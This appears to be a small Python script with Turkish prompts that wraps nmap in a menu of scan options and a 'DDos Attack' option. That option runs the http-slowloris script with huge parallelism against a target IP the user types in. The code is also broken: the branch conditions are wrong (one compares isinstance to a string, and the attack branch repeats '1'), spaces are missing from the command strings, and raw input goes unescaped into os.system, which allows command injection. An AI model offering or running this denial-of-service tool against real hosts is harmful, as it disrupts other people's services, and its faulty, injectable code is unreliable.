import os

def nmap_attack():
    print("""
    -------------------------------------
           welcome to Nmap Tool
    -------------------------------------
          1 -   Nmap Search
          2 -   -sV -sC
          3 -   DDos Attack
    --------------------------------------   
    """)
    islemNo = input("Lütfen işlem numarasini giriniz: ")
    ip = input("lütfen hedef ip'yi giriniz: ")
    
    if(islemNo =="1"):
        os.system("nmap "+ip)
    elif(isinstance == "2"):
        os.system("nmap -sV -sC"+ip )
    elif(islemNo =="1"):
        os.system("nmap"+ip+" -max-parallelism 1000000 -Pn --script http-slowloris --script-args http-slowloris.run forever=True")
    else:
        return nmap_attack()
nmap_attack()